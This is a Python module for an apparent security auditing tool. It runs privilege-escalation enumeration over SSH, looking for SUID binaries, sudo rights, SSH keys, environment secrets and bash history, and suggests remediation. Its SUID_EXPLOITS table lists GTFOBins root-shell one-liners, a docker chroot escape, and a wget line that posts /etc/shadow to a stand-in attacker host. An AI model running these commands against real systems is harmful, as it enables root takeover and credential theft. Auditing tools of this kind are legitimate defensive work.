"""
Netrunner Privilege Escalation Scanner — Automated privesc detection.

Provides:
- Linux privilege escalation path detection (LinPEAS-style)
- Windows privilege escalation path detection (WinPEAS-style)
- SUID/SGID binary detection
- Sudo misconfiguration detection
- Capabilities detection
- Kernel exploit suggestions
"""

import asyncio
import json
import os
import time
from typing import Optional
from backend.core.logger import log as logger

try:
    import paramiko

    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

PRIVESC_DIR = "data/privesc"


def _ensure_privesc_dir():
    os.makedirs(PRIVESC_DIR, exist_ok=True)


async def _ssh_exec(
    host: str, username: str, password: str, command: str, port: int = 22
) -> tuple[int, str, str]:
    """Execute a command over SSH."""
    if not PARAMIKO_AVAILABLE:
        return -1, "", "paramiko not installed"

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        await asyncio.to_thread(
            client.connect,
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=10,
            look_for_keys=False,
            allow_agent=False,
        )
        _, stdout, stderr = await asyncio.to_thread(
            client.exec_command, command, timeout=60
        )
        exit_code = await asyncio.to_thread(stdout.channel.recv_exit_status)
        out = await asyncio.to_thread(stdout.read().decode, errors="replace")
        err = await asyncio.to_thread(stderr.read().decode, errors="replace")
        return exit_code, out, err
    except Exception as e:
        return -1, "", str(e)
    finally:
        client.close()


# Linux privesc checks
LINUX_CHECKS = [
    {
        "id": "suid_binaries",
        "name": "SUID Binaries",
        "severity": "high",
        "command": "find / -perm -4000 -type f 2>/dev/null | head -30",
        "description": "Check for SUID binaries that could be exploited",
    },
    {
        "id": "sgid_binaries",
        "name": "SGID Binaries",
        "severity": "medium",
        "command": "find / -perm -2000 -type f 2>/dev/null | head -30",
        "description": "Check for SGID binaries that could be exploited",
    },
    {
        "id": "writable_etc",
        "name": "Writable /etc Files",
        "severity": "critical",
        "command": "find /etc -writable -type f 2>/dev/null | head -20",
        "description": "Check for writable system configuration files",
    },
    {
        "id": "cron_writable",
        "name": "Writable Cron Jobs",
        "severity": "high",
        "command": "find /etc/cron* -writable -type f 2>/dev/null; cat /etc/crontab 2>/dev/null",
        "description": "Check for writable cron jobs",
    },
    {
        "id": "sudo_check",
        "name": "Sudo Configuration",
        "severity": "high",
        "command": "sudo -nl 2>/dev/null || echo 'SUDO_NOT_AVAILABLE'",
        "description": "Check sudo permissions for current user",
    },
    {
        "id": "capabilities",
        "name": "Linux Capabilities",
        "severity": "medium",
        "command": "getcap -r / 2>/dev/null | head -20 || echo 'CAPABILITIES_NOT_AVAILABLE'",
        "description": "Check for files with special capabilities",
    },
    {
        "id": "world_writable",
        "name": "World-Writable Files",
        "severity": "medium",
        "command": "find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -30",
        "description": "Check for world-writable files",
    },
    {
        "id": "password_files",
        "name": "Password Files",
        "severity": "critical",
        "command": "cat /etc/passwd | grep -v nologin | grep -v false | head -20",
        "description": "Check for users with login shells",
    },
    {
        "id": "ssh_keys",
        "name": "SSH Keys",
        "severity": "high",
        "command": "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | head -10",
        "description": "Check for private SSH keys",
    },
    {
        "id": "docker_group",
        "name": "Docker Group Membership",
        "severity": "high",
        "command": "id | grep -q docker && echo 'IN_DOCKER_GROUP' || echo 'NOT_IN_DOCKER_GROUP'",
        "description": "Check if user is in docker group",
    },
    {
        "id": "lxd_group",
        "name": "LXD Group Membership",
        "severity": "high",
        "command": "id | grep -q lxd && echo 'IN_LXD_GROUP' || echo 'NOT_IN_LXD_GROUP'",
        "description": "Check if user is in lxd group",
    },
    {
        "id": "kernel_version",
        "name": "Kernel Version",
        "severity": "info",
        "command": "uname -r && cat /etc/os-release 2>/dev/null | head -5",
        "description": "Get kernel version for exploit matching",
    },
    {
        "id": "env_secrets",
        "name": "Environment Variables with Secrets",
        "severity": "critical",
        "command": "env | grep -iE '(password|secret|key|token|api)' 2>/dev/null | head -10",
        "description": "Check for secrets in environment variables",
    },
    {
        "id": "bash_history",
        "name": "Bash History",
        "severity": "medium",
        "command": "cat /root/.bash_history 2>/dev/null | tail -20 || cat ~/.bash_history 2>/dev/null | tail -20",
        "description": "Check bash history for credentials",
    },
    {
        "id": "mounted_filesystems",
        "name": "Mounted Filesystems",
        "severity": "medium",
        "command": "mount | grep -E '(nfs|cifs|fuse)' && cat /etc/fstab 2>/dev/null",
        "description": "Check for NFS/CIFS mounts that could be exploited",
    },
]

# Known SUID exploits
SUID_EXPLOITS = {
    "nmap": "GTFOBins - nmap --interactive",
    "vim": "GTFOBins - vim -c ':!/bin/sh'",
    "find": "GTFOBins - find . -exec /bin/sh \\; -quit",
    "bash": "GTFOBins - bash -p",
    "less": "GTFOBins - less /etc/passwd then !/bin/sh",
    "more": "GTFOBins - more /etc/passwd then !/bin/sh",
    "nano": "GTFOBins - nano then Ctrl+R then Ctrl+X",
    "cp": "GTFOBins - cp /etc/shadow /tmp/shadow; cp /etc/passwd /tmp/passwd",
    "mv": "GTFOBins - mv /etc/passwd /tmp/passwd",
    "awk": "GTFOBins - awk 'BEGIN {system(\"/bin/sh\")}'",
    "perl": "GTFOBins - perl -e 'exec \"/bin/sh\";'",
    "python": 'GTFOBins - python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "python3": 'GTFOBins - python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    "ruby": "GTFOBins - ruby -e 'exec \"/bin/sh\"'",
    "lua": "GTFOBins - lua -e 'os.execute(\"/bin/sh\")'",
    "php": "GTFOBins - php -r 'pcntl_exec(\"/bin/sh\");'",
    "env": "GTFOBins - env /bin/sh",
    "strace": "GTFOBins - strace -o /dev/null /bin/sh",
    "ltrace": "GTFOBins - ltrace /bin/sh",
    "gdb": "GTFOBins - gdb -nx -ex '!sh' -ex quit",
    "zip": "GTFOBins - zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'",
    "tar": "GTFOBins - tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "wget": "GTFOBins - wget --post-file /etc/shadow http://attacker.com",
    "curl": "GTFOBins - curl file:///etc/shadow",
    "ssh": "GTFOBins - SSH_ASKPASS=/tmp/x ssh user@host -o StrictHostKeyChecking=no",
    "docker": "GTFOBins - docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
}


async def run_privesc_scan(
    node_id: str,
    host: str,
    username: str,
    password: str,
) -> dict:
    """
    Run privilege escalation scan on a target node.

    Returns:
        dict with scan results and recommendations
    """
    _ensure_privesc_dir()
    scan_id = f"privesc_{int(time.time())}"

    logger.info(f"[PRIVESC] Starting scan on {host} (node={node_id})")

    results = []
    findings = []

    for check in LINUX_CHECKS:
        exit_code, out, err = await _ssh_exec(
            host, username, password, check["command"]
        )

        result = {
            "id": check["id"],
            "name": check["name"],
            "severity": check["severity"],
            "description": check["description"],
            "output": out.strip() if out else err.strip(),
            "raw_lines": len(out.strip().splitlines()) if out else 0,
        }

        # Analyze output for specific findings
        if check["id"] == "suid_binaries" and out:
            for line in out.strip().splitlines():
                binary = os.path.basename(line.strip())
                if binary in SUID_EXPLOITS:
                    findings.append(
                        {
                            "type": "suid_exploit",
                            "severity": "critical",
                            "binary": binary,
                            "path": line.strip(),
                            "exploit": SUID_EXPLOITS[binary],
                            "recommendation": f"Remove SUID bit: chmod u-s {line.strip()}",
                        }
                    )

        if check["id"] == "sudo_check" and "ALL" in (out or ""):
            findings.append(
                {
                    "type": "sudo_all",
                    "severity": "critical",
                    "description": "User has full sudo access (sudo ALL)",
                    "recommendation": "Restrict sudo permissions",
                }
            )

        if check["id"] == "docker_group" and "IN_DOCKER_GROUP" in (out or ""):
            findings.append(
                {
                    "type": "docker_escape",
                    "severity": "critical",
                    "description": "User is in docker group - can escape to root",
                    "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    "recommendation": "Remove user from docker group",
                }
            )

        if check["id"] == "env_secrets" and out and "NOT_AVAILABLE" not in out:
            findings.append(
                {
                    "type": "env_secrets",
                    "severity": "critical",
                    "description": "Secrets found in environment variables",
                    "output": out.strip(),
                    "recommendation": "Remove secrets from environment",
                }
            )

        results.append(result)

    # Calculate risk score
    risk_score = 0
    for finding in findings:
        if finding["severity"] == "critical":
            risk_score += 40
        elif finding["severity"] == "high":
            risk_score += 20
        elif finding["severity"] == "medium":
            risk_score += 10
    risk_score = min(100, risk_score)

    scan_result = {
        "scan_id": scan_id,
        "node_id": node_id,
        "host": host,
        "username": username,
        "timestamp": time.time(),
        "risk_score": risk_score,
        "findings_count": len(findings),
        "results": results,
        "findings": findings,
    }

    # Save scan
    scan_path = os.path.join(PRIVESC_DIR, f"{scan_id}.json")
    with open(scan_path, "w") as f:
        json.dump(scan_result, f, indent=2)

    logger.info(
        f"[PRIVESC] Scan {scan_id} complete: risk={risk_score}%, findings={len(findings)}"
    )

    return scan_result


def list_scans() -> list[dict]:
    """List all privesc scans."""
    _ensure_privesc_dir()
    scans = []
    for f in sorted(os.listdir(PRIVESC_DIR), reverse=True):
        if f.endswith(".json") and f.startswith("privesc_"):
            try:
                with open(os.path.join(PRIVESC_DIR, f)) as fh:
                    data = json.load(fh)
                    scans.append(
                        {
                            "scan_id": data["scan_id"],
                            "node_id": data["node_id"],
                            "host": data["host"],
                            "risk_score": data["risk_score"],
                            "findings_count": data["findings_count"],
                            "timestamp": data["timestamp"],
                        }
                    )
            except Exception:
                pass
    return scans


def get_scan_detail(scan_id: str) -> Optional[dict]:
    """Get detailed scan results."""
    scan_path = os.path.join(PRIVESC_DIR, f"{scan_id}.json")
    if os.path.exists(scan_path):
        with open(scan_path) as f:
            return json.load(f)
    return None
